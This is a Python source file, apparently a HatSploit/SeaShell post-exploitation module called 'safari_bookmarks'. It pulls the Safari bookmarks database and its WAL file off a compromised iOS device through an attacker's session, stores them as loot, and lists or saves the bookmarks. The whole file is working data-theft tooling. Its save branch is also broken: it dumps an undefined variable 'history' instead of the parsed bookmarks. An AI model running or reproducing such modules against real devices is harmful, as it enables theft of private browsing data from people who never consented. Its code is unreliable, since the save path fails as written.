"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

import json

from seashell.lib.loot import Loot

from pex.db import DB

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "safari_bookmarks",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "View Safari bookmarks or save as json.",
            'Usage': "safari_bookmarks [local_file]",
            'MinArgs': 0
        }

        self.db = DB()

        self.db_file = '/private/var/mobile/Library/Safari/Bookmarks.db'
        self.wal_file = '/private/var/mobile/Library/Safari/Bookmarks.db-wal'

    def run(self, argc, argv):
        if not self.session.download(
                self.db_file, Loot().specific_loot('Bookmarks.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('Bookmarks.db-wal')):
            return

        self.print_process("Parsing bookmarks database...")

        try:
            bookmarks = self.db.parse_safari_bookmarks(
                Loot().specific_loot('Bookmarks.db'))
        except Exception:
            self.print_error("Failed to parse bookmarks database!")
            return

        if argc >= 2:
            with open(argv[1], 'w') as f:
                self.print_process(f"Saving bookmarks to {argv[1]}...")
                json.dump(history, f)

            self.print_success(f"Saved bookmarks to {argv[1]}!")
            return

        bookmarks_data = []

        for item in bookmarks:
            bookmarks_data.append((item['title'], item['url']))

        if bookmarks_data:
            self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
        else:
            self.print_warning("No bookmarks available on device.")
